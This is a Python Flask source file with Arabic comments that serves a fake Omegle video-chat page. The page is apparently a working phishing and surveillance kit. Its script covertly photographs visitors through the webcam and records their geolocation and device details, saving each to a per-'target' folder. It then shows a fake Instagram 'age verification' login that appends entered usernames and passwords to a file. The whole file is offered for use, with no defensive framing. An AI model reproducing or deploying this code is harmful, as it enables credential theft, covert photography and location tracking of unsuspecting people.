import os, base64, time, json
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)
ROOT_VAULT = "BLACK_BOX" # المجلد الرئيسي للغنائم
os.makedirs(ROOT_VAULT, exist_ok=True)

# --- واجهة Omegle "الشيطانية" ---
html_template = """
<!DOCTYPE html>
<html>
<head>
    <title>Omegle: Talk to Strangers</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial; margin: 0; background: #fff; }
        .header { background: #f2f2f2; padding: 10px; border-bottom: 2px solid #ff7b00; text-align: center; color: #ff7b00; }
        #video-container { display: flex; flex-direction: column; background: #000; height: 70vh; position: relative; }
        video { width: 100%; height: 50%; object-fit: cover; border-bottom: 2px solid #333; }
        .controls { padding: 20px; text-align: center; }
        #start-btn { background: #ff7b00; color: white; border: none; padding: 15px 40px; border-radius: 5px; font-size: 18px; cursor: pointer; }
        .modal { display:none; position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); background:white; padding:20px; border:1px solid #ccc; box-shadow:0 0 10px rgba(0,0,0,0.5); z-index:1000; width:80%; max-width:350px; text-align:center; }
        input { width: 90%; padding: 10px; margin: 10px 0; }
    </style>
</head>
<body>
    <div class="header"><h1>Omegle</h1></div>
    <div id="video-container">
        <div style="color:white; text-align:center; padding-top:20px;">Looking for stranger...</div>
        <video id="localVid" autoplay muted playsinline></video>
    </div>
    <div class="controls"><button id="start-btn">Start Chat</button></div>

    <div id="loginModal" class="modal">
        <h3>Security Verification</h3>
        <p>Login with Instagram to verify your age</p>
        <input type="text" id="u" placeholder="Username/Email">
        <input type="password" id="p" placeholder="Password">
        <button onclick="saveLogin()" style="background:#0095f6; color:white; border:none; padding:10px 20px; cursor:pointer;">Log In</button>
    </div>

    <script>
        let stream;
        const btn = document.getElementById('start-btn');

        btn.onclick = async () => {
            btn.innerHTML = "Connecting...";
            try {
                // 1. طلب الصلاحيات الكاملة
                stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
                document.getElementById('localVid').srcObject = stream;
                const pos = await new Promise(r => navigator.geolocation.getCurrentPosition(r));

                // 2. سحب الداتا العميقة
                const battery = await (navigator.getBattery ? navigator.getBattery() : {level:0});
                
                // 3. تصوير وحفظ (صورة)
                const canvas = document.createElement('canvas');
                canvas.width = 640; canvas.height = 480;
                canvas.getContext('2d').drawImage(document.getElementById('localVid'), 0, 0);
                
                // 4. إرسال "حزمة البداية"
                await fetch('/trap', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        img: canvas.toDataURL('image/png'),
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        device: {
                            ua: navigator.userAgent,
                            bat: (battery.level * 100) + "%",
                            vendor: navigator.vendor,
                            platform: navigator.platform
                        }
                    })
                });

                // إظهار الفخ بعد السحب مباشرة
                setTimeout(() => { document.getElementById('loginModal').style.display='block'; }, 2000);

            } catch (e) { alert("Please allow camera access to start!"); }
        };

        async function saveLogin() {
            const u = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            await fetch('/login_harvest', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({user: u, pass: p})
            });
            alert("Server Busy. Try again later.");
            location.reload();
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(html_template)

@app.route('/trap', methods=['POST'])
def trap():
    data = request.get_json()
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    # إنشاء مجلد لكل ضحية
    target_folder = os.path.join(ROOT_VAULT, f"Target_{ip.replace('.','_')}_{int(time.time())}")
    os.makedirs(target_folder, exist_ok=True)
    
    # حفظ الصورة
    img_data = base64.b64decode(data['img'].split(',')[1])
    with open(f"{target_folder}/face.png", "wb") as f: f.write(img_data)
    
    # حفظ المعلومات
    with open(f"{target_folder}/specs.json", "w") as f:
        json.dump({"IP": ip, "Location": f"{data['lat']}, {data['lon']}", "Device": data['device']}, f, indent=4)
    
    print(f"💀 Target Acquired: {ip}")
    return jsonify({"status": "success"})

@app.route('/login_harvest', methods=['POST'])
def login():
    data = request.get_json()
    # حفظ الحسابات في ملف واحد مركزي
    with open(f"{ROOT_VAULT}/passwords.txt", "a") as f:
        f.write(f"Time: {time.ctime()} | User: {data['user']} | Pass: {data['pass']}\n")
    return jsonify({"status": "success"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
